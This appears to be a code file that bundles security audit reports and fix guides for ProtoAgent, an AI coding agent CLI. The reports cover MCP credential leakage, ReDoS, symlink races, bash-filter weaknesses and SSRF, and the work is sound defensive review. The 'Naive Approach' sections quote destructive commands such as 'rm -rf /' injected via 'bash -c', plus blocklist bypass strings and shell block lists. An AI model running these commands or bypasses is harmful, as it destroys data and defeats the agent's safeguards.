  // ...
  const ctx = context ? \` \${safeStringify(context)}\` : '';
  writeToFile(\`[\${ts}] \${label.padEnd(5)} \${message}\${ctx}\\n\`);  // No sanitization
}
\`\`\`

An attacker could:
1. Return tool output with ANSI color codes
2. Inject terminal escape sequences to modify UI
3. Create misleading log entries

**Recommended Fix:**
1. Sanitize ANSI escape sequences from tool output
2. Validate message doesn't contain control characters
3. Consider disabling ANSI codes in log file entirely

---

### 12. LOW: Unvalidated Custom Headers from Environment Variables

**Severity: LOW**
**Type: HTTP Header Injection**
**Affected Files:**
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/config.tsx\` (lines 56-70)
- \`/Users/thomasgauvin/work-in-progress/2025/protoagent/src/App.tsx\` (lines around 370-380)

**Description:**
Custom headers loaded from environment variables aren't validated:

\`\`\`typescript
if (process.env.PROTOAGENT_CUSTOM_HEADERS) {
  return 'none';  // But headers are used without format validation
}
\`\`\`

**Recommended Fix:**
1. Validate header names and values against HTTP spec
2. Reject headers with newlines or control characters
3. Whitelist allowed custom headers
4. Document security implications

---

## CONFIGURATION SECURITY ISSUES

### 13. Information Disclosure: .env File in Repository

**Severity: LOW**
**Type: Credential Exposure**
**Location:** \`/Users/thomasgauvin/work-in-progress/2025/protoagent/.env\`

**Description:**
The \`.env\` file in the repository root contains placeholder credentials:

\`\`\`
OPENAI_API_KEY=your_key_here
GEMINI_API_KEY=your_key_here
ANTHROPIC_API_KEY=your_key_here
\`\`\`

While these are clearly placeholders, this file is tracked in git and could:
1. Train developers to put real credentials here
2. Accidentally get committed with real credentials
3. Serve as an attack surface

**Recommended Fix:**
1. Remove \`.env\` from repository (already in .gitignore)
2. Add \`.env.example\` with template and comments
3. Add pre-commit hook to prevent .env commits
4. Document in README to use environment variables

---

## DEPENDENCY VULNERABILITIES

### 14. Outdated Dependencies Risk

**Severity: MEDIUM**
**Type: Third-party Vulnerability Exposure**

**Critical Dependencies to Review:**
- \`openai\` (^5.23.1) - LLM provider
- \`@modelcontextprotocol/sdk\` (^1.27.1) - MCP support
- \`commander\` (^14.0.1) - CLI parsing
- \`jsonc-parser\` (^3.3.1) - Config parsing

**Recommended Fix:**
1. Run \`npm audit\` and address findings
2. Set up dependabot or renovate for automated updates
3. Implement security testing in CI/CD
4. Consider using npm ci instead of npm install for reproducibility

---

## RECOMMENDATIONS SUMMARY

### Immediate Priorities (Critical/High):
1. Sanitize MCP environment variables (Vuln #1)
2. Redact API keys from error logs (Vuln #2)
3. Implement regex complexity validation (Vuln #3)
4. Fix symlink race conditions (Vuln #4)
5. Validate MCP server commands (Vuln #5)

### Short-term (Medium priority):
6. Improve bash token filtering (Vuln #6)
7. Validate redirect URLs (Vuln #7)
8. Add size limits to edit file operations (Vuln #8)
9. Implement resource rate limiting (Vuln #9)
10. Consistent credential masking (Vuln #10)

### Long-term:
11. Sanitize log output (Vuln #11)
12. Validate custom headers (Vuln #12)
13. Secure .env handling (Vuln #13)
14. Dependency security scanning (Vuln #14)

---

## POSITIVE SECURITY FINDINGS

ProtoAgent demonstrates strong security awareness:

1. **Path Validation**: Comprehensive directory traversal checks
2. **Approval System**: Three-tier security model (hard-blocked, auto-approved, interactive)
3. **Configuration Security**: Proper file permission hardening (0o600/0o700)
4. **Safe Regex**: Uses ripgrep when available for safer regex
5. **Timeout Protection**: Comprehensive timeouts on all external operations
6. **Symlink Detection**: Good symlink attack awareness
7. **JSON Validation**: Proper schema validation for configs
8. **Error Handling**: Good error recovery mechanisms
9. **No SQL Injection**: Not a database application
10. **No Direct Code Execution**: No eval/Function() usage

---

## CONCLUSION

ProtoAgent is a well-architected project with thoughtful security practices. The identified vulnerabilities are mostly in edge cases and advanced attack scenarios. Implementing the recommended fixes, especially for critical items #1-5, would significantly strengthen the security posture. The project would benefit from security-focused code review, dependency scanning, and potentially security testing (fuzzing, penetration testing).

**Recommended Next Steps:**
1. Create security issue tracker for these vulnerabilities
2. Prioritize and assign fixes to development team
3. Implement automated security testing in CI/CD
4. Add security section to CONTRIBUTING.md
5. Consider security audit before production use in sensitive environments
`,
  },
  {
    path: "SECURITY_CHECKPOINT_UPDATES.md",
    content: `# Security Checkpoint Updates

This document tracks the systematic update of checkpoints and tutorials with security fixes.

## Summary

| Part | Checkpoint | Security Features Added |
|------|------------|------------------------|
| 5 | ✅ Updated | Symlink protection (write-file, edit-file), ReDoS protection (search-files) |
| 6 | ✅ Updated | Enhanced bash security (dangerous patterns, shell blocking) |
| 10 | ✅ Updated | Session credential sanitization |
| 11 | ✅ Updated | MCP security (env filtering, command validation, approval) |
| 12 | ✅ Updated | Inherited all Part 11 + 10 security |
| 13 | ✅ Updated | Inherited all previous security |

## Checkpoints Updated

### Part 5: Core Tools

**Files Modified:**
- \`protoagent-build-your-own-checkpoints/part-5/src/tools/write-file.ts\`
  - Added O_CREAT|O_EXCL atomic write protection
  - Added security documentation comments

- \`protoagent-build-your-own-checkpoints/part-5/src/tools/edit-file.ts\`
  - Added O_CREAT|O_EXCL atomic write protection
  - Added security documentation comments

- \`protoagent-build-your-own-checkpoints/part-5/src/tools/search-files.ts\`
  - Added \`isSafeRegex()\` function to prevent ReDoS
  - Added pattern complexity validation
  - Added security documentation comments

### Part 6: Shell Commands

**Documentation Updated:**
- \`docs/build-your-own/part-6.md\`
  - Enhanced DANGEROUS_PATTERNS with fork bombs, pipe-to-shell
  - Enhanced SAFE_COMMANDS
  - Added security explanations

### Part 10: Sessions

**Files Modified:**
- \`protoagent-build-your-own-checkpoints/part-10/src/sessions.ts\`
  - Added \`sanitizeSessionForSave()\` function
  - Added credential redaction before saving
  - Added security documentation comments

**Documentation Updated:**
- \`docs/build-your-own/part-10.md\`
  - Added session sanitization explanation
  - Added security comments in code examples

### Part 11: MCP Integration

**Files Modified:**
- \`protoagent-build-your-own-checkpoints/part-11/src/mcp.ts\`
  - Added \`ALLOWED_MCP_ENV_VARS\` allowlist
  - Added \`BLOCKED_SHELLS\` set
  - Added \`DANGEROUS_ARG_PATTERNS\` regex
  - Added \`validateMcpCommand()\` function
  - Added \`filterMcpEnvironment()\` function
  - Added user approval requirement for MCP servers
  - Added security documentation comments

### Part 12: Sub-Agents

**Files Modified:**
- \`protoagent-build-your-own-checkpoints/part-12/src/mcp.ts\` (copied from part-11)
- \`protoagent-build-your-own-checkpoints/part-12/src/sessions.ts\`
  - Added credential sanitization

### Part 13: Polish & Final

**Files Modified:**
- \`protoagent-build-your-own-checkpoints/part-13/src/mcp.ts\` (copied from part-12)
- \`protoagent-build-your-own-checkpoints/part-13/src/sessions.ts\` (copied from part-12)

## Tutorial Documentation Updates

### docs/build-your-own/part-5.md
- ✅ Updated write_file with security explanation
- ✅ Updated edit_file with security explanation

### docs/build-your-own/part-6.md
- ✅ Enhanced bash tool security documentation
- ✅ Added new dangerous patterns explanation

### docs/build-your-own/part-10.md
- ✅ Added session credential sanitization explanation
- ✅ Added security comments in code

### docs/build-your-own/part-11.md
- ⏸️ Needs update - MCP security section to be added

## Security Pattern Used in Checkpoints

Each checkpoint follows this documentation pattern:

\`\`\`typescript
// Security: [Brief description of protection]
// Naive approach: [What's vulnerable]
// Risk: [Attack scenario]
// Fix: [What the code does]
const protection = implementProtection();
\`\`\`

## Verification

All checkpoints can be verified by:
\`\`\`bash
cd protoagent-build-your-own-checkpoints/part-N
npm install
npm run build
\`\`\`

## Notes

1. **Part 11+ tutorials**: The tutorial documentation (part-11.md, part-12.md, part-13.md) should be updated to include security sections explaining the MCP security features, similar to how part-5 and part-6 were updated.

2. **Atomic write utility**: The checkpoints use inline O_CREAT|O_EXCL code rather than the \`atomic-write.ts\` utility to maintain self-containment for tutorial purposes.

3. **Credential filtering**: Checkpoints use simple regex replacement rather than the full \`credential-filter.ts\` module for simplicity in the tutorial.

## Remaining Work

1. Update part-11.md, part-12.md, part-13.md tutorial documentation with security sections
2. Add security note boxes to each part's introduction
3. Consider adding a "Security Considerations" section to the main build-your-own index
`,
  },
  {
    path: "SECURITY_EXECUTIVE_SUMMARY.md",
    content: `# ProtoAgent Security Analysis - Executive Summary

**Analysis Date:** March 22, 2026  
**Project:** ProtoAgent - TypeScript-based AI Coding Agent CLI  
**Overall Risk Level:** MEDIUM  
**Recommendation:** Address critical/high issues before production deployment

---

## Quick Stats

| Metric | Count |
|--------|-------|
| **Total Vulnerabilities** | 14 |
| **Critical** | 1 |
| **High** | 3 |
| **Medium** | 7 |
| **Low** | 3 |
| **Estimated Fix Time** | 64-104 hours (2-3 weeks) |

---

## Critical Issues (FIX IMMEDIATELY)

### 1. MCP Environment Variable Sanitization 🚨
- **File:** \`src/mcp.ts:56-65\`
- **Risk:** Remote Code Execution
- **Fix Time:** 4 hours
- **Impact:** Attackers can execute arbitrary commands via malicious config files
- **Status:** UNFIXED

---

## High-Priority Issues (FIX WITHIN 2 WEEKS)

### 2. API Keys in Error Logs 📋
- **File:** \`src/agentic-loop.ts:840-844\`
- **Risk:** Sensitive Data Exposure
- **Fix Time:** 6 hours
- **Impact:** Credentials could leak through error messages

### 3. ReDoS Vulnerability 🔄
- **File:** \`src/tools/search-files.ts:196-203\`
- **Risk:** Denial of Service
- **Fix Time:** 4 hours
- **Impact:** Malicious regex patterns can hang the application

### 4. Symlink Race Condition 🔗
- **File:** \`src/utils/path-validation.ts:48-80\`
- **Risk:** Directory Traversal Bypass
- **Fix Time:** 6-8 hours
- **Impact:** TOCTOU vulnerability allows file sandbox escape

---

## Medium-Priority Issues

| # | Issue | File | Fix Time | Impact |
|---|-------|------|----------|--------|
| 5 | MCP Command Injection | \`src/runtime-config.ts\` | 4 hrs | Arbitrary command execution |
| 6 | Weak Bash Filtering | \`src/tools/bash.ts\` | 6 hrs | Filter bypass attacks |
| 7 | URL Redirect Validation | \`src/tools/webfetch.ts\` | 4 hrs | SSRF/Open Redirect |
| 8 | Edit File Memory Limit | \`src/tools/edit-file.ts\` | 3 hrs | DoS via memory exhaustion |
| 9 | No Rate Limiting | Multiple | 6 hrs | Resource exhaustion |
| 10 | Credential Masking | \`src/config.tsx\` | 2 hrs | Credential exposure in output |

---

## Low-Priority Issues

| # | Issue | File | Risk | Fix Time |
|---|-------|------|------|----------|
| 11 | Log Injection | \`src/utils/logger.ts\` | ANSI escape codes | 3 hrs |
| 12 | HTTP Header Injection | \`src/config.tsx\` | Header splitting | 2 hrs |
| 13 | .env File | \`.env\` | Already mitigated ✓ | N/A |
| 14 | Vulnerable Dependencies | \`package.json\` | HIGH severity deps | 4-6 hrs |

---

## Comparison to Pi-Mono

### Vulnerability Count
- **ProtoAgent:** 14 (1 Critical, 3 High, 7 Medium, 3 Low)
- **Pi-Mono:** 14 (4 High, 7 Medium, 3 Low)

### Shared Issues
Both codebases have:
- Undici HTTP vulnerabilities
- Weak credential handling in logs
- No rate limiting on operations
- Dependency management issues

### Unique to ProtoAgent
1. **MCP Environment Variable Sanitization** (CRITICAL)
   - Root cause: MCP-specific architecture
   - Higher severity than pi-mono issues

### Unique to Pi-Mono
1. **XML Entity Expansion** (HIGH)
   - From AWS SDK/fast-xml-parser
   - File type detection vulnerabilities

---

## Action Items

### This Week
- [ ] Fix MCP environment variable sanitization (CRITICAL)
- [ ] Add API key redaction in error logs
- [ ] Add ReDoS protection

### Next 2 Weeks
- [ ] Fix symlink race conditions
- [ ] Validate MCP server commands
- [ ] Improve bash command filtering

### This Month
- [ ] Add URL redirect validation
- [ ] Implement edit file size limits
- [ ] Add rate limiting
- [ ] Update vulnerable dependencies

---

## Files to Review

**Critical Security Code:**
- \`src/mcp.ts\` - MCP server management (NEEDS FIXES)
- \`src/utils/path-validation.ts\` - Path/symlink validation (NEEDS FIXES)
- \`src/tools/bash.ts\` - Command execution (NEEDS IMPROVEMENTS)
- \`src/tools/webfetch.ts\` - HTTP requests (NEEDS FIXES)
- \`src/utils/logger.ts\` - Logging/redaction (NEEDS ADDITIONS)

**Configuration Files:**
- \`package.json\` - Dependency vulnerabilities (NEEDS UPDATES)
- \`.env\` - Already properly gitignored ✓
- \`.gitignore\` - Good security practices ✓

---

## Positive Findings ✓

- Strong path validation preventing directory traversal
- Comprehensive three-tier approval system
- Proper file permission hardening (0o600/0o700)
- Good symlink attack awareness
- Comprehensive timeout protections
- No code execution vulnerabilities (no eval/Function)

---

## Risk Mitigation Strategy

### Immediate (Week 1)
Fix the CRITICAL MCP environment variable sanitization issue. This alone allows RCE via config files.

### Short-term (Weeks 2-3)
Fix the 3 HIGH issues:
- API key redaction
- ReDoS protection
- Symlink race conditions

These could lead to credential exposure, DoS, or sandbox escape.

### Medium-term (Weeks 4-6)
Address the 7 MEDIUM issues to reduce overall attack surface.

### Long-term
Implement automated security scanning, pre-commit hooks, and quarterly security reviews.

---

## Deployment Recommendations

### ✓ Safe for:
- Educational use
- Trusted environments
- Internal tools
- Development

### ✗ NOT Safe for:
- Production deployment (until fixes applied)
- Untrusted user input
- Sensitive data processing
- Security-critical systems

### Recommended Before Production:
1. Apply all CRITICAL/HIGH fixes
2. Run npm audit fix
3. Security code review
4. Penetration testing
5. Set up continuous security scanning

---

## Full Documentation

For complete details including:
- Detailed vulnerability descriptions
- Proof-of-concepts
- Implementation guidance
- Testing strategies
- Security best practices

See: **COMPREHENSIVE_SECURITY_ANALYSIS.md** (1,165 lines)

---

## Key Contacts & Next Steps

1. **Schedule security review meeting** with development team
2. **Assign team members** to fix categories
3. **Create security issues** in project tracker
4. **Set up automated tools** for continuous monitoring
5. **Implement pre-commit hooks** for secret detection
6. **Plan quarterly audits** going forward

---

**Generated:** March 22, 2026  
**Analysis Type:** Comprehensive Security Vulnerability Assessment  
**Confidence Level:** High (based on source code review + existing audit reports)
`,
  },
  {
    path: "SECURITY_FIXES.md",
    content: `# ProtoAgent Security Fixes Guide

This document provides specific code fixes for the identified security vulnerabilities.

## 1. CRITICAL: MCP Environment Variable Sanitization

### File: src/runtime-config.ts

Add environment variable validation:

\`\`\`typescript
// Add after line 33
const ALLOWED_MCP_ENV_VARS = new Set([
  'NODE_ENV',
  'DEBUG',
  'LOG_LEVEL',
  'TIMEOUT',
  // Add only necessary variables, NOT PATH, LD_PRELOAD, etc.
]);

export function sanitizeMcpEnv(env: Record<string, string> | undefined): Record<string, string> | undefined {
  if (!env) return undefined;
  
  const sanitized: Record<string, string> = {};
  for (const [key, value] of Object.entries(env)) {
    if (ALLOWED_MCP_ENV_VARS.has(key)) {
      // Validate value doesn't contain shell metacharacters
      if (!/[;&|\`\$(){}[\\]<>]/.test(value)) {
        sanitized[key] = value;
      }
    }
  }
  return Object.keys(sanitized).length > 0 ? sanitized : undefined;
}
\`\`\`

### File: src/mcp.ts

Update connection code:

\`\`\`typescript
// Change lines 56-65 from:
const transport = new StdioClientTransport({
  command: config.command,
  args: config.args || [],
  env: {
    ...process.env,
    ...(config.env || {}),
  } as Record<string, string>,
  cwd: config.cwd,
  stderr: 'pipe',
});

// To:
import { sanitizeMcpEnv } from './runtime-config.js';

const sanitizedEnv = sanitizeMcpEnv(config.env);
const transport = new StdioClientTransport({
  command: config.command,
  args: config.args || [],
  env: sanitizedEnv ? {
    // Only pass through safe environment variables
    NODE_ENV: process.env.NODE_ENV,
    ...sanitizedEnv,
  } : {
    NODE_ENV: process.env.NODE_ENV,
  },
  cwd: config.cwd,
  stderr: 'pipe',
});
\`\`\`

---

## 2. HIGH: API Keys in Error Logs

### File: src/utils/logger.ts

Add credential redaction:

\`\`\`typescript
// Add new utility function
function redactSensitiveData(text: string): string {
  // Redact API keys (common patterns)
  return text
    .replace(/(['\\"])?(api[_-]?key|apikey|secret|password|token)['\\"]?\\s*:\\s*(['\\"])?[^,\\s}'"]+/gi, '\$1\$2\$1: [REDACTED]')
    .replace(/Authorization:\\s*Bearer\\s+[^\\s]+/gi, 'Authorization: Bearer [REDACTED]')
    .replace(/x-api-key:\\s*[^\\s]+/gi, 'x-api-key: [REDACTED]')
    .replace(/sk[-_][a-zA-Z0-9]+/g, '[REDACTED_KEY]')
    .replace(/pk[-_][a-zA-Z0-9]+/g, '[REDACTED_KEY]');
}

// Update log function (line 103)
function log(level: LogLevel, label: string, message: string, context?: Record<string, unknown>): void {
  if (level > currentLevel) return;
  const ts = timestamp();

  const sanitizedMessage = redactSensitiveData(message);
  const sanitizedContext = context ? redactContext(context) : undefined;

  const entry: LogEntry = {
    timestamp: ts,
    level,
    message: sanitizedMessage,
    context: sanitizedContext,
  };

  // ... rest of function
}

function redactContext(context: Record<string, unknown>): Record<string, unknown> {
  const redacted: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(context)) {
    if (typeof value === 'string' && /api|key|secret|password|token/i.test(key)) {
      redacted[key] = '[REDACTED]';
    } else if (typeof value === 'string') {
      redacted[key] = redactSensitiveData(value);
    } else {
      redacted[key] = value;
    }
  }
  return redacted;
}
\`\`\`

### File: src/agentic-loop.ts

Update error logging (lines 840-844):

\`\`\`typescript
// Change from:
try {
  if (apiError?.response) {
    responseBody = JSON.stringify(apiError.response);
  } else if (apiError?.error) {
    responseBody = JSON.stringify(apiError.error);
  }
} catch { /* ignore */ }

// To:
try {
  if (apiError?.response) {
    // Only include status and type, not full response
    responseBody = JSON.stringify({
      status: apiError.response?.status,
      type: apiError.response?.type || typeof apiError.response,
      message: apiError.response?.message || 'See debug logs'
    });
  } else if (apiError?.error?.message) {
    responseBody = apiError.error.message.substring(0, 200);
  }
} catch { /* ignore */ }
\`\`\`

---

## 3. HIGH: ReDoS Vulnerability

### File: src/tools/search-files.ts

Add regex validation:

\`\`\`typescript
// Add at top of file
import type { default as SafeRegex } from 'safe-regex';
let safeRegex: typeof SafeRegex | null = null;

async function getSafeRegex() {
  if (!safeRegex) {
    try {
      const mod = await import('safe-regex');
      safeRegex = mod.default;
    } catch {
      // Fallback if package not available
      return null;
    }
  }
  return safeRegex;
}

// Update searchWithJs function (line 189)
export async function searchWithJs(
  searchTerm: string,
  validated: string,
  directoryPath: string,
  caseSensitive: boolean,
  fileExtensions?: string[],
): Promise<string> {
  const flags = caseSensitive ? 'g' : 'gi';
  let regex: RegExp;
  
  try {
    // Check regex complexity before creating
    const safeRegexCheck = await getSafeRegex();
    if (safeRegexCheck) {
      if (!safeRegexCheck(searchTerm)) {
        return \`Error: Regex pattern is potentially unsafe (catastrophic backtracking risk)\`;
      }
    }
    
    regex = new RegExp(searchTerm, flags);
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    return \`Error: invalid regex pattern "\${searchTerm}": \${message}\`;
  }

  // ... rest of function
}
\`\`\`

Add dependency to package.json:
\`\`\`json
"dependencies": {
  "safe-regex": "^2.1.1"
}
\`\`\`

---

## 4. HIGH: Symlink Race Condition

### File: src/utils/path-validation.ts

Implement safer path validation:

\`\`\`typescript
import { open, realpath } from 'node:fs/promises';
import { constants } from 'node:fs';

export async function validatePath(requestedPath: string): Promise<string> {
  const resolved = path.resolve(workingDirectory, requestedPath);
  const normalized = path.normalize(resolved);

  // First check: is the normalised path within cwd?
  if (!isAllowedPath(normalized)) {
    throw new Error(\`Path "\${requestedPath}" is outside the working directory.\`);
  }

  // Second check: resolve symlinks and re-check
  try {
    const realPath = await realpath(normalized);
    if (!isAllowedPath(realPath)) {
      throw new Error(\`Path "\${requestedPath}" resolves (via symlink) outside the working directory.\`);
    }
    
    // Return real path for immediate use, but we'll verify again at operation time
    return realPath;
  } catch (err: any) {
    if (err.code === 'ENOENT') {
      // File doesn't exist yet — validate the parent directory instead
      const parentDir = path.dirname(normalized);
      try {
        const realParent = await realpath(parentDir);
        if (!isAllowedPath(realParent)) {
          throw new Error(\`Parent directory of "\${requestedPath}" resolves outside the working directory.\`);
        }
        return path.join(realParent, path.basename(normalized));
      } catch {
        throw new Error(\`Parent directory of "\${requestedPath}" does not exist.\`);
      }
    }
    throw err;
  }
}

// Add immediate pre-operation verification
export async function verifyPathStillValid(filePath: string): Promise<void> {
  try {
    const realPath = await realpath(filePath);
    if (!isAllowedPath(realPath)) {
      throw new Error(\`Path changed - now outside working directory\`);
    }
  } catch (err: any) {
    if (err.code !== 'ENOENT') {
      throw err; // File was deleted or symlink broken - let the operation handle it
    }
  }
}
\`\`\`

Update file tools to use verification:

\`\`\`typescript
// In read-file.ts
export async function readFile(filePath: string, offset = 0, limit = 2000, sessionId?: string): Promise<string> {
  let validated: string;
  try {
    validated = await validatePath(filePath);
    await verifyPathStillValid(validated); // Add this line
  } catch (err: any) {
    // ... error handling
  }
  // ... rest of function
}
\`\`\`

---

## 5. MEDIUM: MCP Command Validation

### File: src/runtime-config.ts

Add command validation:

\`\`\`typescript
import { execSync } from 'node:child_process';

export async function validateMcpServerConfig(config: RuntimeMcpServerConfig): Promise<string[]> {
  const errors: string[] = [];

  if (config.type === 'stdio') {
    // Validate command exists
    try {
      execSync(\`which \${config.command}\`, { stdio: 'pipe' });
    } catch {
      errors.push(\`MCP server command not found: \${config.command}\`);
    }

    // Validate args don't contain shell metacharacters
    if (config.args) {
      for (const arg of config.args) {
        if (/[;&|\`\$(){}[\\]<>'"]/.test(arg)) {
          errors.push(\`MCP server arg contains shell metacharacters: \${arg}\`);
        }
      }
    }

    // Validate cwd if provided
    if (config.cwd) {
      const normalizedCwd = path.normalize(path.resolve(config.cwd));
      const workingDir = process.cwd();
      if (!normalizedCwd.startsWith(workingDir) && normalizedCwd !== workingDir) {
        errors.push(\`MCP server cwd outside working directory: \${config.cwd}\`);
      }
    }
  } else if (config.type === 'http') {
    // Validate HTTP URL
    try {
      const url = new URL(config.url);
      if (!['http:', 'https:'].includes(url.protocol)) {
        errors.push(\`MCP HTTP server must use http:// or https://\`);
      }
    } catch {
      errors.push(\`Invalid MCP HTTP URL: \${config.url}\`);
    }
  }

  return errors;
}
\`\`\`

---

## 6. MEDIUM: Improved Bash Filtering

### File: src/tools/bash.ts

Strengthen command validation:

\`\`\`typescript
// Replace isSafe function (lines 103-131)
async function isSafe(command: string): Promise<boolean> {
  const trimmed = command.trim();
  if (!trimmed || hasShellControlOperators(trimmed)) {
    return false;
  }

  const tokens = tokenizeCommand(trimmed);
  if (!tokens) {
    return false;
  }

  const firstWord = trimmed.split(/\\s+/)[0];
  
  // Reject known unsafe tokens
  if (UNSAFE_BASH_TOKENS.has(firstWord)) {
    return false;
  }

  // Reject builtins that could be overridden
  const unsafeBuiltins = ['builtin', '.', 'source', 'eval', 'exec'];
  if (unsafeBuiltins.includes(firstWord)) {
    return false;
  }

  // Check if command is in safe list
  const matchedSafeCommand = SAFE_COMMANDS.some((safe) => {
    if (safe.includes(' ')) {
      return trimmed === safe || trimmed.startsWith(\`\${safe} \`);
    }
    return firstWord === safe;
  });

  if (!matchedSafeCommand) {
    return false;
  }

  // Validate paths in arguments
  return validateCommandPaths(tokens);
}

// Enhanced spawn with safety restrictions
async function runBash(
  command: string,
  timeoutMs = 30_000,
  sessionId?: string,
  abortSignal?: AbortSignal
): Promise<string> {
  // ... existing safety checks ...

  logger.debug(\`Executing: \${command}\`);

  return new Promise((resolve) => {
    let stdout = '';
    let stderr = '';
    let timedOut = false;
    let aborted = false;

    const child = spawn(command, [], {
      shell: true,
      cwd: process.cwd(),
      env: {
        // Filter environment to only safe variables
        PATH: process.env.PATH,
        HOME: process.env.HOME,
        USER: process.env.USER,
        SHELL: process.env.SHELL,
      },
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    // ... rest of function
  });
}
\`\`\`

---

## 7. MEDIUM: URL Redirect Validation

### File: src/tools/webfetch.ts

Add redirect target validation:

\`\`\`typescript
// Add validation function
function isValidRedirectTarget(url: string): boolean {
  try {
    const parsed = new URL(url);
    
    // Only allow http and https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return false;
    }

    // Reject localhost and private IP ranges
    const hostname = parsed.hostname;
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      return false;
    }

    // Reject private IP ranges
    const privateRanges = [
      /^192\\.168\\./,
      /^10\\./,
      /^172\\.(1[6-9]|2[0-9]|3[01])\\./,
      /^::1\$/,
      /^fc00:/,
    ];
    
    if (privateRanges.some(range => range.test(hostname))) {
      return false;
    }

    return true;
  } catch {
    return false;
  }
}

// Update fetchWithRedirectLimit function (line 203)
async function fetchWithRedirectLimit(
  url: string,
  signal: AbortSignal,
): Promise<Response> {
  let redirectCount = 0;
  let currentUrl = url;

  const originalFetch = global.fetch;

  while (redirectCount < MAX_REDIRECTS) {
    const response = await originalFetch(currentUrl, {
      signal,
      headers: FETCH_HEADERS,
      redirect: "manual",
    });

    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get("location");
      if (location) {
        // Validate redirect target
        if (!isValidRedirectTarget(location)) {
          throw new Error(
            \`Redirect target not allowed: \${location}\`
          );
        }
        
        redirectCount++;
        currentUrl = new URL(location, currentUrl).href;
        continue;
      }
    }

    return response;
  }

  throw new Error(\`Too many redirects (max \${MAX_REDIRECTS})\`);
}
\`\`\`

---

## 8. MEDIUM: Edit File Fuzzy Matching Limits

### File: src/tools/edit-file.ts

Add size validation:

\`\`\`typescript
// Add at top of file
const MAX_OLD_STRING_LENGTH = 50_000;  // 50KB max
const MAX_OLD_STRING_LINES = 1_000;    // 1000 lines max

// Update editFile function (line 292)
export async function editFile(
  filePath: string,
  oldString: string,
  newString: string,
  expectedReplacements = 1,
  sessionId?: string,
): Promise<string> {
  if (oldString.length === 0) {
    return 'Error: old_string cannot be empty.';
  }

  // Add size validation
  if (oldString.length > MAX_OLD_STRING_LENGTH) {
    return \`Error: old_string too large (\${oldString.length} bytes, max \${MAX_OLD_STRING_LENGTH})\`;
  }

  const lineCount = oldString.split('\\n').length;
  if (lineCount > MAX_OLD_STRING_LINES) {
    return \`Error: old_string has too many lines (\${lineCount}, max \${MAX_OLD_STRING_LINES})\`;
  }

  // ... rest of function
}
\`\`\`

---

## Implementation Priority

1. **Week 1**: Implement fixes #1, #2, #3 (Critical + High)
2. **Week 2**: Implement fixes #4, #5 (High + Medium)
3. **Week 3**: Implement fixes #6, #7, #8 (Remaining Medium)
4. **Week 4**: Low priority fixes, testing, documentation

Each fix should include:
- Unit tests
- Integration tests
- Security test cases
- Documentation updates

`,
  },
  {
    path: "SECURITY_FIXES_IMPLEMENTED.md",
    content: `# Security Fixes Implemented

**Date**: Security Audit Remediation  
**Status**: Phase 1 Complete (Critical & High Priority Fixes)

---

## Summary

This document describes the security fixes implemented to address critical and high priority vulnerabilities identified in the ProtoAgent security audit. Each fix includes:
- The vulnerability description
- The naive (vulnerable) approach
- The security risk
- The implemented fix
- Files modified

---

## ✅ COMPLETED FIXES

### 🔴 CRITICAL #2, #5, #6: MCP Security (Combined)

**Vulnerabilities:**
1. Environment variable exfiltration to MCP servers
2. Unvalidated MCP server commands (command injection)
3. No approval required for MCP server connections

**Naive Approach:**
\`\`\`typescript
// Pass ALL environment variables to MCP
env: { ...process.env, ...config.env }

// Accept any command without validation
command: config.command  // Could be "bash -c 'rm -rf /'"

// Auto-connect without user approval
await connectStdioServer(name, config);
\`\`\`

**Security Risk:**
- Malicious MCP servers steal API keys (OPENAI_API_KEY, etc.)
- Command injection via shell interpreters
- Unauthorized code execution

**Fix Implemented (src/mcp.ts):**
1. **Environment Filtering**: Only allowlisted env vars passed to MCP:
   \`\`\`typescript
   const ALLOWED_MCP_ENV_VARS = ['PATH', 'HOME', 'USER', 'LANG', ...];
   \`\`\`
2. **Command Validation**: Block shell interpreters and dangerous patterns:
   \`\`\`typescript
   const BLOCKED_SHELLS = new Set(['sh', 'bash', 'zsh', 'powershell', ...]);
   const DANGEROUS_ARG_PATTERNS = /[;|&\$()\`<>]/;
   \`\`\`
3. **User Approval**: Require explicit approval before connecting:
   \`\`\`typescript
   const approved = await requestApproval({
     type: 'shell_command',
     description: \`Connect to MCP server: \${name}\`,
     detail: 'MCP servers can execute arbitrary code...'
   });
   \`\`\`

---

### 🔴 CRITICAL #4, #8: Credential Protection in Sessions

**Vulnerability:** API keys and credentials persisted in session files in plaintext

**Naive Approach:**
\`\`\`typescript
// Save session as-is
await fs.writeFile(path, JSON.stringify(session, null, 2));
// Result: API keys in tool outputs readable by anyone with file access
\`\`\`

**Security Risk:**
- Session files contain API keys from tool outputs
- Multi-user systems: other users can read credentials
- Credentials leak in session history

**Fix Implemented (src/sessions.ts):**
\`\`\`typescript
function sanitizeSessionForSave(session: Session): Session {
  const sanitizedMessages = session.completionMessages.map((msg) => {
    if (typeof msg.content === 'string') {
      msg.content = maskCredentials(msg.content);  // Redact keys
    }
    // Also sanitize tool_calls and tool results
    ...
  });
  return { ...session, completionMessages: sanitizedMessages };
}
\`\`\`

---

### 🔴 CRITICAL #7: Temporary File Symlink Race Condition

**Vulnerability:** TOCTOU race in atomic file writes

**Naive Approach:**
\`\`\`typescript
// Write to temp file, then rename
await fs.writeFile(tmpPath, content);
await fs.rename(tmpPath, target);  // Attacker can symlink tmpPath to /etc/passwd
\`\`\`

**Security Risk:**
- Attacker creates symlink at temp path
- Write overwrites arbitrary files (privilege escalation)

**Fix Implemented (src/tools/write-file.ts, src/tools/edit-file.ts):**
\`\`\`typescript
// Use O_CREAT|O_EXCL - fail if file exists (prevents following symlinks)
let fd: FileHandle | undefined;
fd = await fs.open(tmpPath, 'wx', 0o600);  // 'x' = O_EXCL
await fd.writeFile(content, 'utf8');
await fd.sync();  // Ensure data hits disk
await fd.close();
await fs.rename(tmpPath, validated);
\`\`\`

---

### 🟠 HIGH #9: Weak Bash Command Filtering

**Vulnerability:** Regex-based blocklist with multiple bypasses

**Naive Approach:**
\`\`\`typescript
const DANGEROUS_PATTERNS = ['sudo', 'rm -rf /'];
// Bypasses: 's\\udo', '\$(which sudo)', '/bin/rm', 'bash -c "rm -rf /"'
\`\`\`

**Security Risk:**
- Blocklist easily bypassed with escape sequences
- Shell control operators not properly detected

